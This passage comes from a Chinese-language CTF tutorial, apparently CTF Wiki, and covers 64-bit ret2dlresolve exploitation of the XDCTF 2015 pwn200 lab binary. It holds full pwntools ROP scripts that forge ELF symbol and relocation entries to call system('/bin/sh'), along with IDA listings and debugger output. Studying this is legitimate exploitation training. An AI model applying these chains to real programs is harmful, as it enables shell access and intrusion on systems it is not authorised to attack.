<span class=n>dynstr</span> <span class=o>=</span> <span class=n>dynstr</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&quot;read&quot;</span><span class=p>,</span><span class=s2>&quot;system&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600B30</span><span class=o>+</span><span class=mh>0x100</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)))</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400607</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)</span>

<span class=c1># read /bin/sh\x00</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600B30</span><span class=o>+</span><span class=mh>0x100</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>),</span><span class=nb>len</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)))</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400607</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>


<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x0000000000400771</span><span class=p>)</span> <span class=c1>#pop rsi; pop r15; ret; </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x0000000000400773</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x600B30</span><span class=o>+</span><span class=mh>0x100</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400516</span><span class=p>)</span> <span class=c1># the second instruction of read@plt </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=nb>print</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>dump</span><span class=p>())</span>
<span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>()))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <h3 id=partial-relro_1>Partial RELRO<a class=headerlink href=#partial-relro_1 title="Permanent link">&para;</a></h3> <p>還是利用 2015 年 xdctf 的 pwn200 進行介紹。</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>gcc<span class=w> </span>-fno-stack-protector<span class=w> </span>-z<span class=w> </span>relro<span class=w>  </span>-no-pie<span class=w> </span>../../main.c<span class=w> </span>-o<span class=w> </span>main_partial_relro_64
❯<span class=w> </span>checksec<span class=w> </span>main_partial_relro_64
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>amd64-64-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x400000<span class=o>)</span>
</code></pre></div> <p>這裏我們仍然以手工構造和基於工具構造兩種方式來介紹 64 位下的 ret2dlresolve。</p> <h4 id=_4>手工僞造<a class=headerlink href=#_4 title="Permanent link">&para;</a></h4> <p>這裏我們就不一步步展示了。直接採用最終的思路。</p> <h5 id=64_1>64 位的變化<a class=headerlink href=#64_1 title="Permanent link">&para;</a></h5> <p>首先，我們先來看一下 64 位中的一些變化。</p> <p>glibc 中默認編譯使用的是 <code>ELF_Rela</code> 來記錄重定位項的內容</p> <div class=highlight><pre><span></span><code><span class=k>typedef</span><span class=w> </span><span class=k>struct</span>
<span class=p>{</span>
<span class=w>  </span><span class=n>Elf64_Addr</span><span class=w>        </span><span class=n>r_offset</span><span class=p>;</span><span class=w>                </span><span class=cm>/* Address */</span>
<span class=w>  </span><span class=n>Elf64_Xword</span><span class=w>        </span><span class=n>r_info</span><span class=p>;</span><span class=w>                        </span><span class=cm>/* Relocation type and symbol index */</span>
<span class=w>  </span><span class=n>Elf64_Sxword</span><span class=w>        </span><span class=n>r_addend</span><span class=p>;</span><span class=w>                </span><span class=cm>/* Addend */</span>
<span class=p>}</span><span class=w> </span><span class=n>Elf64_Rela</span><span class=p>;</span>
<span class=cm>/* How to extract and insert information held in the r_info field.  */</span>
<span class=cp>#define ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)</span>
<span class=cp>#define ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span>
<span class=cp>#define ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span>
</code></pre></div> <p>這裏 Elf64_Addr、Elf64_Xword、Elf64_Sxword 都爲 64 位，因此 Elf64_Rela 結構體的大小爲 24 字節。</p> <p>根據 IDA 裏的重定位表的信息可以知道，write 函數在符號表中的偏移爲 1（0x100000007h&gt;&gt;32） 。</p> <div class=highlight><pre><span></span><code>LOAD:0000000000400488 ; ELF JMPREL Relocation Table
LOAD:0000000000400488                 Elf64_Rela &lt;601018h, 100000007h, 0&gt; ; R_X86_64_JUMP_SLOT write
LOAD:00000000004004A0                 Elf64_Rela &lt;601020h, 200000007h, 0&gt; ; R_X86_64_JUMP_SLOT strlen
LOAD:00000000004004B8                 Elf64_Rela &lt;601028h, 300000007h, 0&gt; ; R_X86_64_JUMP_SLOT setbuf
LOAD:00000000004004D0                 Elf64_Rela &lt;601030h, 400000007h, 0&gt; ; R_X86_64_JUMP_SLOT read
LOAD:00000000004004D0 LOAD            ends
</code></pre></div> <p>確實在符號表中的偏移爲 1。</p> <div class=highlight><pre><span></span><code>LOAD:00000000004002C0<span class=w> </span><span class=p>;</span><span class=w> </span>ELF<span class=w> </span>Symbol<span class=w> </span>Table
LOAD:00000000004002C0<span class=w>      </span>Elf64_Sym<span class=w> </span>&lt;<span class=m>0</span>&gt;
LOAD:00000000004002D8<span class=w>      </span>Elf64_Sym<span class=w> </span>&lt;offset<span class=w> </span>aWrite<span class=w> </span>-<span class=w> </span>offset<span class=w> </span>byte_400398,<span class=w> </span>12h,<span class=w> </span><span class=m>0</span>,<span class=w> </span><span class=m>0</span>,<span class=w> </span><span class=m>0</span>,<span class=w> </span><span class=m>0</span>&gt;<span class=w> </span><span class=p>;</span><span class=w> </span><span class=s2>&quot;write&quot;</span>
LOAD:00000000004002F0<span class=w>      </span>Elf64_Sym<span class=w> </span>&lt;offset<span class=w> </span>aStrlen<span class=w> </span>-<span class=w> </span>offset<span class=w> </span>byte_400398,<span class=w> </span>12h,<span class=w> </span><span class=m>0</span>,<span class=w> </span><span class=m>0</span>,<span class=w> </span><span class=m>0</span>,<span class=w> </span><span class=m>0</span>&gt;<span class=w> </span><span class=p>;</span><span class=w> </span><span class=s2>&quot;strlen&quot;</span>
LOAD:0000000000400308<span class=w>      </span>Elf64_Sym<span class=w> </span>&lt;offset<span class=w> </span>aSetbuf<span class=w> </span>-<span class=w> </span>offset<span class=w> </span>byte_400398,<span class=w> </span>12h,<span class=w> </span><span class=m>0</span>,<span class=w> </span><span class=m>0</span>,<span class=w> </span><span class=m>0</span>,<span class=w> </span><span class=m>0</span>&gt;<span class=w> </span><span class=p>;</span><span class=w> </span><span class=s2>&quot;setbuf&quot;</span>
LOAD:0000000000400320<span class=w>      </span>Elf64_Sym<span class=w> </span>&lt;offset<span class=w> </span>aRead<span class=w> </span>-<span class=w> </span>offset<span class=w> </span>byte_400398,<span class=w> </span>12h,<span class=w> </span><span class=m>0</span>,<span class=w> </span><span class=m>0</span>,<span class=w> </span><span class=m>0</span>,<span class=w> </span><span class=m>0</span>&gt;<span class=w> </span><span class=p>;</span><span class=w> </span><span class=s2>&quot;read&quot;</span>
...
</code></pre></div> <p>在 64 位下，Elf64_Sym 結構體爲</p> <div class=highlight><pre><span></span><code><span class=k>typedef</span><span class=w> </span><span class=k>struct</span>
<span class=p>{</span>
<span class=w>  </span><span class=n>Elf64_Word</span><span class=w>        </span><span class=n>st_name</span><span class=p>;</span><span class=w>                </span><span class=cm>/* Symbol name (string tbl index) */</span>
<span class=w>  </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>char</span><span class=w>        </span><span class=n>st_info</span><span class=p>;</span><span class=w>                </span><span class=cm>/* Symbol type and binding */</span>
<span class=w>  </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=n>st_other</span><span class=p>;</span><span class=w>                </span><span class=cm>/* Symbol visibility */</span>
<span class=w>  </span><span class=n>Elf64_Section</span><span class=w>        </span><span class=n>st_shndx</span><span class=p>;</span><span class=w>                </span><span class=cm>/* Section index */</span>
<span class=w>  </span><span class=n>Elf64_Addr</span><span class=w>        </span><span class=n>st_value</span><span class=p>;</span><span class=w>                </span><span class=cm>/* Symbol value */</span>
<span class=w>  </span><span class=n>Elf64_Xword</span><span class=w>        </span><span class=n>st_size</span><span class=p>;</span><span class=w>                </span><span class=cm>/* Symbol size */</span>
<span class=p>}</span><span class=w> </span><span class=n>Elf64_Sym</span><span class=p>;</span>
</code></pre></div> <p>其中</p> <ul> <li>Elf64_Word 32 位</li> <li>Elf64_Section 16 位</li> <li>Elf64_Addr 64 位</li> <li>Elf64_Xword 64位</li> </ul> <p>所以，Elf64_Sym 的大小爲 24 個字節。</p> <p>除此之外，在 64 位下，plt 中的代碼 push 的是待解析符號在重定位表中的索引，而不是偏移。比如，write 函數 push 的是 0。</p> <div class=highlight><pre><span></span><code>.plt:0000000000400510 ; ssize_t write(int fd, const void *buf, size_t n)
.plt:0000000000400510 _write          proc near               ; CODE XREF: main+B3↓p
.plt:0000000000400510                 jmp     cs:off_601018
.plt:0000000000400510 _write          endp
.plt:0000000000400510
.plt:0000000000400516 ; ---------------------------------------------------------------------------
.plt:0000000000400516                 push    0
.plt:000000000040051B                 jmp     sub_400500
</code></pre></div> <h5 id=first-try-leak>First Try - leak<a class=headerlink href=#first-try-leak title="Permanent link">&para;</a></h5> <p>根據上述的分析，我們可以寫出如下腳本</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400780</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40079A</span>
<span class=n>vuln_addr</span> <span class=o>=</span> <span class=mh>0x400637</span>

<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>


<span class=k>def</span><span class=w> </span><span class=nf>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=n>func_name</span><span class=p>,</span> <span class=n>resolve_addr</span><span class=p>):</span>
    <span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

    <span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rela.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
    <span class=n>relaent</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s2>&quot;DT_RELAENT&quot;</span><span class=p>)</span> <span class=c1># reloc entry size</span>

    <span class=n>dynsym</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynsym&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
    <span class=n>syment</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s2>&quot;DT_SYMENT&quot;</span><span class=p>)</span> <span class=c1># symbol entry size</span>

    <span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

    <span class=c1># construct fake function string</span>
    <span class=n>func_string_addr</span> <span class=o>=</span> <span class=n>store_addr</span>
    <span class=n>resolve_data</span> <span class=o>=</span> <span class=n>func_name</span> <span class=o>+</span> <span class=s2>&quot;</span><span class=se>\x00</span><span class=s2>&quot;</span>

    <span class=c1># construct fake symbol</span>
    <span class=n>symbol_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
    <span class=n>offset</span> <span class=o>=</span> <span class=n>symbol_addr</span> <span class=o>-</span> <span class=n>dynsym</span>
    <span class=n>pad</span> <span class=o>=</span> <span class=n>syment</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>%</span> <span class=n>syment</span> <span class=c1># align syment size</span>
    <span class=n>symbol_addr</span> <span class=o>=</span> <span class=n>symbol_addr</span><span class=o>+</span><span class=n>pad</span>
    <span class=n>symbol</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>func_string_addr</span><span class=o>-</span><span class=n>dynstr</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x12</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>symbol_index</span> <span class=o>=</span> <span class=p>(</span><span class=n>symbol_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span><span class=o>/</span><span class=mi>24</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>pad</span>
    <span class=n>resolve_data</span> <span class=o>+=</span> <span class=n>symbol</span>

    <span class=c1># construct fake reloc </span>
    <span class=n>reloc_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
    <span class=n>offset</span> <span class=o>=</span> <span class=n>reloc_addr</span> <span class=o>-</span> <span class=n>rel_plt</span>
    <span class=n>pad</span> <span class=o>=</span> <span class=n>relaent</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>%</span> <span class=n>relaent</span> <span class=c1># align relaent size</span>
    <span class=n>reloc_addr</span> <span class=o>+=</span><span class=n>pad</span>
    <span class=n>reloc_index</span> <span class=o>=</span> <span class=p>(</span><span class=n>reloc_addr</span><span class=o>-</span><span class=n>rel_plt</span><span class=p>)</span><span class=o>/</span><span class=mi>24</span>
    <span class=n>rinfo</span> <span class=o>=</span> <span class=p>(</span><span class=n>symbol_index</span><span class=o>&lt;&lt;</span><span class=mi>32</span><span class=p>)</span> <span class=o>|</span> <span class=mi>7</span>
    <span class=n>write_reloc</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>resolve_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>rinfo</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>pad</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=n>write_reloc</span>

    <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>reloc_index</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>resolve_data</span><span class=p>,</span> <span class=n>resolve_call</span>


<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>

<span class=n>store_addr</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x100</span>

<span class=c1># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>resolve_data</span><span class=p>,</span> <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=s2>&quot;system&quot;</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;write&quot;</span><span class=p>])</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>store_addr</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)))</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=c1># send resolve data</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>

<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span>
<span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>bin_sh_addr</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>)))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>


<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x00000000004007a3</span><span class=p>)</span> <span class=c1># 0x00000000004007a3: pop rdi; ret; </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>resolve_call</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>然而， 簡單地運行後發現，程序崩潰了。</p> <div class=highlight><pre><span></span><code>─────────────────────────────────[ REGISTERS ]──────────────────────────────────
*RAX  0x4003f6 ◂— 0x2000200020000
*RBX  0x601018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7fe00aa8e250 (write) ◂— lea    rax, [rip + 0x2e06a1]
*RCX  0x155f100000007
*RDX  0x155f1
*RDI  0x400398 ◂— 0x6f732e6362696c00
*RSI  0x601158 ◂— 0x1200200db8
*R8   0x0
 R9   0x7fe00af7a4c0 ◂— 0x7fe00af7a4c0
*R10  0x7fe00af98170 ◂— 0x0
 R11  0x246
*R12  0x6161616161616161 (&#39;aaaaaaaa&#39;)
*R13  0x6161616161616161 (&#39;aaaaaaaa&#39;)
*R14  0x6161616161616161 (&#39;aaaaaaaa&#39;)
*R15  0x6161616161616161 (&#39;aaaaaaaa&#39;)
*RBP  0x6161616161616161 (&#39;aaaaaaaa&#39;)
*RSP  0x7fffb43c82a0 ◂— 0x0
*RIP  0x7fe00ad7eeb4 (_dl_fixup+116) ◂— movzx  eax, word ptr [rax + rdx*2]
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x7fe00ad7eeb4 &lt;_dl_fixup+116&gt;    movzx  eax, word ptr [rax + rdx*2]
   0x7fe00ad7eeb8 &lt;_dl_fixup+120&gt;    and    eax, 0x7fff
   0x7fe00ad7eebd &lt;_dl_fixup+125&gt;    lea    rdx, [rax + rax*2]
   0x7fe00ad7eec1 &lt;_dl_fixup+129&gt;    mov    rax, qword ptr [r10 + 0x2e0]
   0x7fe00ad7eec8 &lt;_dl_fixup+136&gt;    lea    r8, [rax + rdx*8]
